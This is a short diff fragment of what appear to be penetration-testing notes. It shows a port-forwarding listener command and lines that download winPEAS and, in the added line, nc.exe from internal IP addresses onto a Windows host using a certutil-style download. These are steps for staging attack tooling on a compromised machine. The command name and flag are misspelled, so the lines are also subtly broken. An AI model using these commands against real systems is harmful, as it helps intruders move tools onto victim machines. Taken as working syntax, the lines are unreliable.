@@ -121,4 +121,6 @@ listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
 
 curtutil -urlchache -f http://10.10.120.131:12345/winpeas winpeas
 
+curtutil -urlchache -f http://192.168.209.191:1238/nc.exe nc.exe
+
 ```
